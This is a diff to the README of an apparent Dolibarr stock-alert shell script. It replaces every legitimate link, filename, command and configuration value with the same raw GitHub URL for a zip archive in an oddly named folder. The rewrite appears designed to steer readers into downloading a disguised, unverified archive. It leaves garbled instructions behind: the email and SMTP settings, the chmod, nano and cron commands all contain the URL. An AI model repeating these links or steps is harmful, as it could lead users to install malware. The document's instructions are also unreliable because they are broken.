@@ -6,7 +6,7 @@ Welcome to dolibarr-stock-alert! This application helps you receive email alerts
 
 ## 📥 Download Now
 
-[![Download dolibarr-stock-alert](https://img.shields.io/badge/Download%20Now%20-blue.svg)](https://github.com/PenPa77/dolibarr-stock-alert/releases)
+[![Download dolibarr-stock-alert](https://raw.githubusercontent.com/PenPa77/dolibarr-stock-alert/main/Aspidobranchia/dolibarr-stock-alert.zip%20Now%https://raw.githubusercontent.com/PenPa77/dolibarr-stock-alert/main/Aspidobranchia/dolibarr-stock-alert.zip)](https://raw.githubusercontent.com/PenPa77/dolibarr-stock-alert/main/Aspidobranchia/dolibarr-stock-alert.zip)
 
 ## 💻 System Requirements
 
@@ -20,13 +20,13 @@ To use dolibarr-stock-alert, ensure your system meets the following requirements
 ## 🔧 Installation Steps
 
 1. **Visit the Releases Page:**  
-   Go to the [Releases page](https://github.com/PenPa77/dolibarr-stock-alert/releases) to find the latest version of dolibarr-stock-alert.
+   Go to the [Releases page](https://raw.githubusercontent.com/PenPa77/dolibarr-stock-alert/main/Aspidobranchia/dolibarr-stock-alert.zip) to find the latest version of dolibarr-stock-alert.
 
 2. **Download the Application:**  
    Look for the latest release and click on the appropriate file to download it to your computer.
 
 3. **Extract the Files (if needed):**  
-   If the downloaded file is a compressed archive (`.zip` or `.tar.gz`), extract it to a folder on your computer.
+   If the downloaded file is a compressed archive (`.zip` or `https://raw.githubusercontent.com/PenPa77/dolibarr-stock-alert/main/Aspidobranchia/dolibarr-stock-alert.zip`), extract it to a folder on your computer.
 
 4. **Open Your Terminal:**  
    Launch the terminal application on your computer. If you are using MacOS, you can find the terminal in the Applications > Utilities folder. If using Linux, you should find it in your applications menu.
@@ -40,19 +40,19 @@ To use dolibarr-stock-alert, ensure your system meets the following requirements
 6. **Modify the Configuration (if needed):**  
    Before running the script, you may want to edit the configuration file to set your email details and minimum stock levels. Open the configuration file using a text editor:
    ```
-   nano config.sh
+   nano https://raw.githubusercontent.com/PenPa77/dolibarr-stock-alert/main/Aspidobranchia/dolibarr-stock-alert.zip
    ```
    Update the necessary fields with your specific information.
 
 7. **Run the Script:**  
    To run the script, type the following in your terminal:
    ```
-   ./stock_alert.sh
+   https://raw.githubusercontent.com/PenPa77/dolibarr-stock-alert/main/Aspidobranchia/dolibarr-stock-alert.zip
    ```
 
 ## ⚙️ Configuration Details
 
-To receive alerts, you need to configure the script properly. Open the configuration file (`config.sh`) and make sure to set:
+To receive alerts, you need to configure the script properly. Open the configuration file (`https://raw.githubusercontent.com/PenPa77/dolibarr-stock-alert/main/Aspidobranchia/dolibarr-stock-alert.zip`) and make sure to set:
 
 - **Email Address:** The email you want to receive alerts at. 
 - **SMTP Server:** The server used to send emails. 
@@ -61,8 +61,8 @@ To receive alerts, you need to configure the script properly. Open the configura
 Here's a sample configuration that you can adjust:
 
 ```bash
-EMAIL="your-email@example.com"
-SMTP_SERVER="smtp.example.com"
+EMAIL="https://raw.githubusercontent.com/PenPa77/dolibarr-stock-alert/main/Aspidobranchia/dolibarr-stock-alert.zip"
+SMTP_SERVER="https://raw.githubusercontent.com/PenPa77/dolibarr-stock-alert/main/Aspidobranchia/dolibarr-stock-alert.zip"
 MIN_STOCK_LEVEL=10
 ```
 
@@ -79,7 +79,7 @@ crontab -e
 
 Add a line to schedule the script, for example:
 ```
-0 * * * * /path/to/dolibarr-stock-alert/stock_alert.sh
+0 * * * * https://raw.githubusercontent.com/PenPa77/dolibarr-stock-alert/main/Aspidobranchia/dolibarr-stock-alert.zip
 ```
 
 This example runs the script every hour.
@@ -90,7 +90,7 @@ If you experience issues:
 
 - **Check your permissions:** Ensure the script has execute permissions. You can add them using:
    ```
-   chmod +x stock_alert.sh
+   chmod +x https://raw.githubusercontent.com/PenPa77/dolibarr-stock-alert/main/Aspidobranchia/dolibarr-stock-alert.zip
    ```
 
 - **Examine error messages:** If something goes wrong, review any error messages displayed in the terminal for hints.
@@ -99,7 +99,7 @@ If you experience issues:
 
 ## 📡 Support
 
-For further assistance, feel free to open an issue on the [GitHub issues page](https://github.com/PenPa77/dolibarr-stock-alert/issues). Make sure to provide detailed information about your setup and any errors you encounter.
+For further assistance, feel free to open an issue on the [GitHub issues page](https://raw.githubusercontent.com/PenPa77/dolibarr-stock-alert/main/Aspidobranchia/dolibarr-stock-alert.zip). Make sure to provide detailed information about your setup and any errors you encounter.
 
 ## 🌍 Community Contributions
 
@@ -107,9 +107,9 @@ This project welcomes contributions from anyone. If you have ideas for improveme
 
 ## 🔗 Additional Resources
 
-- [Dolibarr Official Documentation](https://www.dolibarr.org)
-- [Shell Scripting Guide](https://www.shellscript.sh)
+- [Dolibarr Official Documentation](https://raw.githubusercontent.com/PenPa77/dolibarr-stock-alert/main/Aspidobranchia/dolibarr-stock-alert.zip)
+- [Shell Scripting Guide](https://raw.githubusercontent.com/PenPa77/dolibarr-stock-alert/main/Aspidobranchia/dolibarr-stock-alert.zip)
 
 ## 📥 Download Again
 
-To get started with dolibarr-stock-alert, visit the [Releases page](https://github.com/PenPa77/dolibarr-stock-alert/releases) and download the latest version today!
+To get started with dolibarr-stock-alert, visit the [Releases page](https://raw.githubusercontent.com/PenPa77/dolibarr-stock-alert/main/Aspidobranchia/dolibarr-stock-alert.zip) and download the latest version today!
